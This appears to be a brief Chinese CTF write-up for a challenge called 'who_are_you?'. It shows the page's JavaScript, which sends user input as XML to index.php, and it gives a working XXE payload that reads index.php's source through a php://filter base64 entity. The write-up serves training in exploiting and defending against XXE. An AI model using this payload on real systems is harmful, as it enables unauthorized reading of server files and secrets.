who_are_you?
打开题目链接 是一个欢迎界面 随意测试了admin 发现会回显admin
ctrl+u查看源码 发现
```javascript
    function play() {
        return false;
    }
    function func() {
        // document.getElementById().value
        var xml = '' +
            '<\?xml version="1.0" encoding="UTF-8"\?>' +
            '<feedback>' +
            '<author>' + document.getElementById('name').value+ '</author>' +
            '</feedback>';
        console.log(xml);
        var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
            if (xmlhttp.readyState == 4) {
                // console.log(xmlhttp.readyState);
                // console.log(xmlhttp.responseText);
                var res = xmlhttp.responseText;
                document.getElementById('title').textContent = res
            }
        };
        xmlhttp.open("POST", "index.php", true);
        xmlhttp.send(xml);
        return false;
```

交互过程是通过xml完成的 因此想到xxe

payload:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=./index.php" >]>
<feedback><author>&xxe;</author></feedback>
```

